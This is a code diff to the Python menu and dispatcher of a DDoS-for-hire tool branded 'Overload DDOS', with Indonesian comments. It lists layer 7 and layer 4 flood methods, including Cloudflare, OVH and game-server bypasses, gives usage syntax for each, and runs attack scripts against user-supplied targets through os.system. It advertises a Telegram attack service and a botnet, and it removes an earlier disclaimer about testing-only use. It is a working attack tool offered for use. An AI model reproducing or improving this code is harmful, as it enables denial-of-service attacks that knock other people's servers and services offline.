@@ -97,61 +97,126 @@ def si():
 
 def layer7():
     clear_screen()
-    si()
-    print(f'''
- ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-                                LAYER 7 METHODS                                                     
-┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫   
- ┏━━━━━━━━━━┓┏━━━━━━━━━━┓┏━━━━━━━━━━┓┏━━━━━━━━━━┓
-  →httpbypass      →cfgas          →http-storm       →tls  
- ┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫
-  →cf-bypass       →uambypass      →httpget         →auto 
- ┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫
-  →crash            →httpflood       →cf-socket        →cf-pro  
- ┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫
-  →hyper            →slow            →https-spoof     →http-requests  
- ┗━━━━━━━━━━┛┗━━━━━━━━━━┛┗━━━━━━━━━━┛┗━━━━━━━━━━┛
-''')
+    si() # Memanggil fungsi si()
+    print("--------------------------------------------------")
+    print("                LAYER 7 METHODS                   ")
+    print("--------------------------------------------------")
+    print("▶ httpbypass    : Metode bypass HTTP umum untuk WAF/CDN (misalnya Cloudflare/Captcha)")
+    print("▶ cfgas         : Cloudflare GAS (Serangan banjir HTTP/S tingkat tinggi dengan logika bypass)")
+    print("▶ http-storm    : Metode banjir HTTP volume tinggi")
+    print("▶ tls           : Serangan Banjir TLS Handshake (menguras sumber daya TLS server)")
+    print("▶ cf-bypass     : Metode bypass Cloudflare generik")
+    print("▶ uambypass     : Bypass untuk 'Under Attack Mode' Cloudflare")
+    print("▶ httpget       : Serangan banjir permintaan HTTP GET standar")
+    print("▶ auto          : Pemilihan metode serangan otomatis berdasarkan analisis target")
+    print("▶ crash         : Upaya untuk merusak server target (misalnya, melalui permintaan yang salah format)")
+    print("▶ httpflood     : Banjir HTTP dasar (tingkat tinggi, berbagai jenis permintaan)")
+    print("▶ cf-socket     : Serangan berbasis soket tingkat rendah untuk target yang dilindungi Cloudflare")
+    print("▶ cf-pro        : Teknik bypass Cloudflare yang lebih canggih atau 'profesional'")
+    print("▶ hyper         : Serangan dengan laju permintaan yang sangat tinggi")
+    print("▶ slow          : Serangan mirip Slowloris (mempertahankan koneksi lambat untuk menguras sumber daya server)")
+    print("▶ https-spoof   : Mencoba memalsukan permintaan HTTPS agar terlihat sah atau melewati filter")
+    print("▶ http-requests : Metode umum untuk mengirim berbagai jenis permintaan HTTP")
+    print("--------------------------------------------------")
+
+# Catatan: Pastikan fungsi `clear_screen()` dan `si()` sudah terdefinisi di bagian lain kode Anda.
 
 def layer4():
     clear_screen()
-    si()
-    print(f'''
- ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-                                LAYER 4 METHODS                                                     
-┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫   
- ┏━━━━━━━━━━┓┏━━━━━━━━━━┓┏━━━━━━━━━━┓┏━━━━━━━━━━┓
-  →udp              →tcp              →nfo-killer         →std  
- ┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫
-  →udpbypass      →destroy          →home            →god  
- ┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫
-  →slowloris        →flux              →stdv2            →stress  
- ┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫
-  →ovh-raw          →ovh-beam       →overflow        →brutal  
- ┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫
-  →ovh-amp         →minecraft       →samp            →ldap  
- ┗━━━━━━━━━━┛┗━━━━━━━━━━┛┗━━━━━━━━━━┛┗━━━━━━━━━━┛
-''')
+    si() # Memanggil fungsi si()
+    print("--------------------------------------------------")
+    print("                LAYER 4 METHODS                   ")
+    print("--------------------------------------------------")
+    print("▶ udp          : Banjir paket UDP dasar")
+    print("▶ tcp          : Banjir paket TCP (SYN, ACK, dll.)")
+    print("▶ nfo-killer   : Banjir khusus yang menargetkan server game (seringkali NFOservers)")
+    print("▶ std          : Banjir generik standar (umum untuk Layer 4)")
+    print("▶ udpbypass    : Upaya untuk melewati perlindungan banjir UDP")
+    print("▶ destroy      : Banjir intens yang bertujuan membanjiri dan merusak layanan")
+    print("▶ home         : Banjir generik untuk beban umum")
+    print("▶ god          : Metode banjir yang sangat kuat atau serbaguna")
+    print("▶ slowloris    : Serangan Slowloris (mempertahankan koneksi lambat untuk menguras sumber daya server - *Catatan: Ini adalah metode Layer 7*)")
+    print("▶ flux         : Banjir yang terkait dengan serangan DNS (mis. DNS Flux/Subdomain acak)")
+    print("▶ stdv2        : Banjir standar versi 2 (versi yang diperbarui)")
+    print("▶ ovh-raw      : Banjir paket mentah yang menargetkan server yang dilindungi OVH")
+    print("▶ ovh-beam     : Teknik banjir spesifik untuk perlindungan OVH")
+    print("▶ overflow     : Banjir yang mencoba menyebabkan *buffer overflow* atau kehabisan sumber daya")
+    print("▶ ovh-amp      : Serangan amplifikasi yang menargetkan OVH")
+    print("▶ minecraft    : Banjir khusus yang menargetkan server Minecraft")
+    print("▶ samp         : Banjir khusus yang menargetkan server San Andreas Multiplayer (SA-MP)")
+    print("▶ ldap         : Banjir Amplifikasi LDAP")
+    print("--------------------------------------------------")
 
-def rules():
+# Catatan: Pastikan fungsi `clear_screen()` dan `si()` sudah terdefinisi di bagian lain kode Anda.
+
+def usage():
     clear_screen()
-    si()
-    print(f'''                                
-+----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-| No. | Rules                                                                                                                                                                                                                                                                                                                                                                                                                        |
-|----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-| 1   | The owner does not recommend attacking the government, if you do so you must be willing to take responsibility and accept all risks                                                                                                                                                                                                                                                                                                                                  |
-| 2   | Only attack for testing servers                                                                                                                                                                                                                                                                                                                                                                                                                     |
-| 3   | The creator is not responsible if this tool is used by the wrong person for unlawful activities                                                                                                                                                                                                                                                                                                                                     |
-+----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-''')
-    
+    si() # Memanggil fungsi si()
+    print("--------------------------------------------------")
+    print("        USAGE METODE LAYER 7 & LAYER 4         ")
+    print("--------------------------------------------------")
+
+    print("\n--- METODE LAYER 7 ---")
+    print("▶ httpbypass    : httpbypass target.com 60")
+    print("▶ cfgas         : cfgas terget.com 60")
+    print("▶ http-storm    : http-storm target.com 60")
+    print("▶ tls           : tls target.com 60")
+    print("▶ cf-bypass     : cf-bypass target.com 60")
+    print("▶ uambypass     : uambypass target.com 60")
+    print("▶ httpget       : httpget target.com 60")
+    print("▶ auto          : auto target.com 60")
+    print("▶ crash         : crash target.com GET")
+    print("▶ httpflood     : httpflood target.com 15000 get 60")
+    print("▶ cf-socket     : cf-socket target.com 60 100 100")
+    print("▶ cf-pro        : cf-pro target.com 60 100 100")
+    print("▶ hyper         : hyper target.com 60")
+    print("▶ slow          : slow target.com 60")
+    print("▶ https-spoof   : https-spoof target.com 60")
+    print("▶ http-requests : http-requests target.com 60")
+
+    print("\n--- METODE LAYER 4 ---")
+    print("▶ udp          : udp 1.1.1.1 port")
+    print("▶ tcp          : tcp GET/POST/HEAD 1.1.1.1 port 60 8500")
+    print("▶ nfo-killer   : nfo-killer 1.1.1.1 port 850 60")
+    print("▶ std          : std 1.1.1.1 port")
+    print("▶ udpbypass    : udpbypass 1.1.1.1 port")
+    print("▶ destroy      : destroy 1.1.1.1 port 60")
+    print("▶ home         : home 1.1.1.1 port 65500 60")
+    print("▶ god          : god 1.1.1.1 port 60")
+    print("▶ slowloris    : slowloris 1.1.1.1 port")
+    print("▶ flux         : flux 1.1.1.1 port 250")
+    print("▶ stdv2        : stdv2 1.1.1.1 port")
+    print("▶ ovh-raw      : ovh-raw GET 1.1.1.1 port 60 8500")
+    print("▶ ovh-beam     : ovh-beam GET 1.1.1.1 port 60")
+    print("▶ overflow     : overflow 1.1.1.1 port 5000")
+    print("▶ ovh-amp      : ovh-amp 1.1.1.1 port")
+    print("▶ minecraft    : minecraft 1.1.1.1 5000 500 60")
+    print("▶ samp         : samp 1.1.1.1 7777'")
+    print("▶ ldap         : ldap 1.1.1.1 port 650 60")
+    print("--------------------------------------------------")
+
+# Catatan: Pastikan fungsi `clear_screen()` dan `si()` sudah terdefinisi di bagian lain kode Anda.
+
+# Fungsi getproxy sudah didefinisikan dengan benar di tingkat global
+def getproxy():
+    clear_screen()
+    si() # Memanggil fungsi si()
+    print("Starting proxy collection process...")
+    # Langsung jalankan skrip getproxy.py tanpa argumen
+    os.system('python3 getproxy.py')
+    print("Proxy save succesfull. Please check from proxies.txt.")
+   
 def menu():
+    # Mengatur judul jendela terminal (jika didukung)
     sys.stdout.write(f"         \x1b]2;Overload Server --> Online Botnet: [{bots}] | Stresser Panel | VIP (true)\x07")
     clear_screen()
-    print('[ t.me/POWERPROOFOVERLOAD ] | Welcome to Overload DDOS! | Owner: @OverloadServer | Update v3.0')
+    
+    # Pesan informasi awal dengan efek kedip MERAH
+    print("\x1b[5;31m" + '[ t.me/POWERPROOFOVERLOAD ] | Welcome to Overload DDOS! | Owner: @OverloadServer | Update v3.0' + "\x1b[0m")
     print("")
-    print("""  
+
+    # Seni ASCII (logo) - Diatur ke warna PUTIH statis untuk kontras
+    print("\x1b[37m" + """  
                             ████████████                
                        ██████         ██████          
                     ████                    ████                
@@ -176,38 +241,96 @@ def menu():
 ██    ████                                    ██
   ██                                         ██
     ██████████████████████████████████████    
-                                                                                                                                                                                                              
-╔══════════════════════════════════════════════╗
-║           WELCOME TO OVERLOAD C2                         
-║ - - - - - - Copyright 2024-2026 [OverloadServer] - - - - - - -
-╚══════════════════════════════════════════════╝
-╔══════════════════════════════════════╗
-║>T.ME/POWERPROOFOVERLOAD< BEST ATTACK SERVICE
-╚══════════════════════════════════════╝
-╔══════════════════════════════════════════════╗
-LAYER7  ► SHOW LAYER7 METHODS FOR ATTACK DOMAIN
-LAYER4  ► SHOW LAYER4 METHODS FOR ATTACK IP
-RULES   ► RULES PANEL
-CLEAR   ► CLEAR TERMINAL 
-╚══════════════════════════════════════════════╝
-""")
+""" + "\x1b[0m") # Reset warna setelah seni ASCII
+
+    # --- Integrasi Banner yang sudah dirapikan dengan warna & efek kedip ---
+    box_content_width = 66 
+
+    # Fungsi bantu untuk menggambar garis border atas
+    def draw_top_border(width):
+        return f"╔{'═' * width}╗"
+
+    # Fungsi bantu untuk menggambar garis border bawah
+    def draw_bottom_border(width):
+        return f"╚{'═' * width}╝"
+
+    # Fungsi bantu yang dimodifikasi untuk menerima kode warna dan opsi kedip
+    def draw_middle_line(text, width, align='center', color_code="", blink=False):
+        if align == 'center':
+            padded_text = text.center(width)
+        elif align == 'left':
+            padded_text = text.ljust(width)
+        
+        start_code = ""
+        end_code = ""
+        
+        if blink:
+            start_code += "\x1b[5m" # Tambahkan kode kedip
+        if color_code:
+            start_code += color_code # Tambahkan kode warna
+
+        if start_code: # Hanya tambahkan reset jika ada gaya yang diterapkan
+            end_code = "\x1b[0m"
+
+        return f"║{start_code}{padded_text}{end_code}║"
+    
+    # --- Banner Selamat Datang ---
+    print(draw_top_border(box_content_width))
+    # Teks "WELCOME TO OVERLOAD C2" akan berkedip PUTIH
+    print(draw_middle_line("WELCOME TO OVERLOAD C2", box_content_width, color_code="\x1b[37m", blink=True)) 
+    # Teks copyright akan PUTIH statis
+    print(draw_middle_line("- - - - - - Copyright 2024-2026 [OverloadServer] - - - - - - -", box_content_width, color_code="\x1b[37m")) 
+    print(draw_bottom_border(box_content_width))
+
+    print("") # Baris kosong sebagai pemisah
+
+    # --- Banner Telegram ---
+    print(draw_top_border(box_content_width))
+    # Teks Telegram akan berkedip MERAH
+    print(draw_middle_line(">T.ME/POWERPROOFOVERLOAD< BEST ATTACK SERVICE", box_content_width, color_code="\x1b[31m", blink=True)) 
+    print(draw_bottom_border(box_content_width))
+
+    print("") # Baris kosong sebagai pemisah
+
+    # --- Banner Menu Utama ---
+    print(draw_top_border(box_content_width))
+    # Teks menu akan PUTIH statis
+    print(draw_middle_line("LAYER7  ► SHOW LAYER7 METHODS FOR ATTACK DOMAIN", box_content_width, align='left', color_code="\x1b[37m")) 
+    print(draw_middle_line("LAYER4  ► SHOW LAYER4 METHODS FOR ATTACK IP", box_content_width, align='left', color_code="\x1b[37m")) 
+    print(draw_middle_line("USAGE   ► USAGE PANEL", box_content_width, align='left', color_code="\x1b[37m"))
+    print(draw_middle_line("GETPROXY   ► UPDATE PROXY", box_content_width, align='left', color_code="\x1b[37m"))
+    print(draw_middle_line("CLEAR   ► CLEAR TERMINAL", box_content_width, align='left', color_code="\x1b[37m")) 
+    print(draw_bottom_border(box_content_width))
+
+# Catatan Penting:
+# - Pastikan variabel `bots` terdefinisi di kode Anda.
+# - Efek kedip dan warna ini menggunakan kode ANSI escape. Dukungan dan tampilan bisa bervariasi
+#   tergantung pada terminal yang Anda gunakan (misalnya, CMD Windows mungkin tidak mendukung penuh).
+# - Fungsi `clear_screen()` dan `si()` diasumsikan sudah terdefinisi di bagian lain dari skrip Anda.
 
 def main():
-    menu()
+    menu() # Memanggil fungsi menu untuk menampilkan tampilan awal
     while(True):        
+        # Prompt untuk input pengguna
         print('\033[ROOT\033] \033►\033[KOMINFO] ', end='')
-        cnc = input()
+        cnc = input().strip() # Menggunakan .strip() untuk menghapus spasi di awal/akhir
         print("Anda memasukkan:", cnc)
-        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
-            layer7()
-        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
-            layer4()
-        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
-            main()    
-        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
-            rules()    
-                        
+        
+        # Normalisasi input ke huruf kecil untuk perbandingan yang lebih mudah dan case-insensitive
+        command_lower = cnc.lower()
 
+        if command_lower in ["layer7", "l7"]: # Kondisi disederhanakan
+            layer7()
+        elif command_lower in ["layer4", "l4"]: # Kondisi disederhanakan
+            layer4()
+        elif command_lower in ["clear", "cls"]: # Kondisi disederhanakan
+            clear_screen() # Panggil clear_screen() untuk membersihkan terminal
+            menu() # Tampilkan kembali menu setelah membersihkan layar
+        elif command_lower == "usage": # Kondisi disederhanakan, hapus redundansi
+            usage() 
+        elif command_lower == "getproxy": # Kondisi disederhanakan, hapus redundansi
+            getproxy() # Panggilan ke fungsi getproxy() yang didefinisikan di atas
+    
 # LAYER 4 METHODS   
 
         elif "udpbypass" in cnc:
@@ -436,23 +559,6 @@ def main():
                 print('Usage: overflow <ip> <port> <threads>')
                 print('Example: overflow 1.1.1.1 80 5000')
                
-        elif "brutal" in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                bytes = cnc.split()[3]
-                thrs = cnc.split()[4]
-                bost = cnc.split()[5]
-                os.system(f'python3 brutal.py {ip} {port} 500 500 Y')
-                token = "727e8c2fa5b07c"
-                ip = f"{ip}"
-                info = get_ip_info(token, ip)
-                print(info)
-            except Exception as e:
-                print(f"Error executing command: {e}")           
-            except IndexError:    
-                print('Example: brutal 1.1.1.1 80 500 500 Y/N')
-
         elif "samp" in cnc:
             try:
                 ip = cnc.split()[1]
@@ -541,15 +647,15 @@ def main():
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 thread = cnc.split()[3]
-                os.system(f'python3 https-spoof.py {url} {time} {thread}')
+                os.system(f'python3 https-spoof.py {url} {time} 100')
                 url = f"{url}"
                 token = "727e8c2fa5b07c"
                 result = get_url_info(url, token)
                 print(result) 
             except IndexError:
                 print('Usage: https-spoof <url> <time> <threads>')
-                print('Example: https-spoof http://vailon.com 60 500')
-    
+                print('Example: https-spoof http://vailon.com 60 500')                
+        
         elif "slow" in cnc:
             try:
                url, time = cnc.split()[1:3]
@@ -974,7 +1080,9 @@ def main():
             except ValueError as ve:
                 print(f"Waktu tidak valid: {ve}")
             except Exception as e:
-                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")                                                                                                                                                                       
+                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")   
+            else:
+                print(f"Unknown command: '{cnc}'. Type 'usage' for available commands.")                                                                                                                                                                                    
 
 def generate_and_verify_captcha(length=4):
     while True:
